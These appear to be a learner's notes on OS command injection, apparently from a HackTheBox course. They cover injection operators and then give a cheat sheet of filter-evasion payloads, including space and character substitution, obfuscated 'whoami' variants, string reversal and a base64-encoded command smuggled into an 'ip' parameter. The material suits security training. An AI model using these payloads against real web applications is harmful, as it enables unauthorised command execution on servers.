Many web applications execute local Operating System commands to perform certain processes. For example, a web application may install a plugin of our choosing by executing an OS command that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (i.e., as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called [command injection](https://owasp.org/www-community/attacks/Command_Injection).

This vulnerability is widespread, as developers may not properly sanitize user input or use weak tests to do so, allowing attackers to bypass any checks or filtering put in place and execute their commands.

For example, the WordPress Plugin `Plainview Activity Monitor 20161228` has a [vulnerability](https://www.exploit-db.com/exploits/45274) that allows attackers to inject their command in the `ip` value, by simply adding `| COMMAND...` after the `ip` value.


##### PHP
`exec`, `system`, `shell_exec`, `passthru`, or `popen`

##### NodeJS
`child_process.exec` or `child_process.spawn` 

#### Operators:
```
%0a - new line
&
&&
|
;
```

##### Bypass spaces:
* `%09` - tab char
* `${IFS}` - variable of space and tab
* `{ls,-la}` - brace expansion

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

###### Bypass /; blacklisted:
```shell
la1n23@htb[/htb]$ echo ${PATH:0:1}
/

la1n23@htb[/htb]$ echo ${LS_COLORS:10:1}
;
```

```powershell
C:\htb> echo %HOMEPATH:~6,-11%
\

$env:HOMEPATH[0]
\

PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>

```


Shifting
```shell
la1n23@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
la1n23@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

##### Bypass blacklisted commands
linux & win:
```shell
21y4d@htb[/htb]$ w'h'o'am'i

21y4d

21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

only linux:
```bash
w\ho\am\i

who$@ami
```

windows only:
```powershell
C:\htb> who^ami
```

##### Case manipulation

```shell
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Reverse string:
```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')
```

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
```

Automated tools:
https://github.com/Bashfuscator/Bashfuscator
https://github.com/danielbohannon/Invoke-DOSfuscation

base64
```
ip=1.1.1.1%0bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```